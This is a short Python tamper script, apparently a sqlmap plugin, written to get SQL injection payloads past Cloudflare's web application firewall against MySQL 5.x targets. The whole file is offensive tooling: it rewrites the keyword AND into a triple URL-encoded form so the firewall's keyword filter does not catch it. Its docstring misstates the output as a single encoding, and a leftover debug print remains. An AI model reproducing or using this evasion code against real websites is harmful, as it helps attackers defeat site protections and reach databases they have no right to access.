#!/usr/bin/env python
# cloudflareand.py
# @dualfade

import re

def tamper(payload, **kwargs):
    """
    Replaces ('AND') with '%41%4e%44'

    Tested against:
        * MySQL 5.x

    Notes:
        * Custom to bypass CloudFlare 01112022
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"\b(AND)\b", retVal):
            if len(match.group(0)) > 1:
                s = str(match.group(1))
                # urlencodeall --
                e = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in s)
                print(e)

                # urlencode each encoded char --
                y = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in e)
                z = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in y)
                retVal = retVal.replace(match.group(1), z)

            else:
                pass

        # ret --
        return retVal